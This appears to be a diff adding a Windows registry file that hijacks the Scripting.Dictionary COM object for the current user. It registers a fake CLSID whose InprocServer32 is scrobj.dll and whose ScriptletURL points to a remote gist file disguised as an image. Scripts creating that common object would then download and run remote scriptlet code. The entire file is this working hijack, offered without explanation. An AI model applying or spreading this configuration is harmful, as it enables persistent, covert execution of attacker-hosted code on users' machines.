@@ -1,0 +1,24 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]
+@=""
+
+[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]
+@="{00000001-0000-0000-0000-0000FEEDACDC}"
+
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
+@="Scripting.Dictionary"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
+@="C:\\WINDOWS\\system32\\scrobj.dll"
+"ThreadingModel"="Apartment"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
+@="Scripting.Dictionary"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
+@="https://gist.githubusercontent.com/enigma0x3/4373e9a63aaebe177c747af9bc6da743/raw/2207d8a1a536371aff5f61c8bef8400622868976/wee.png"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
+@="Scripting.Dictionary"
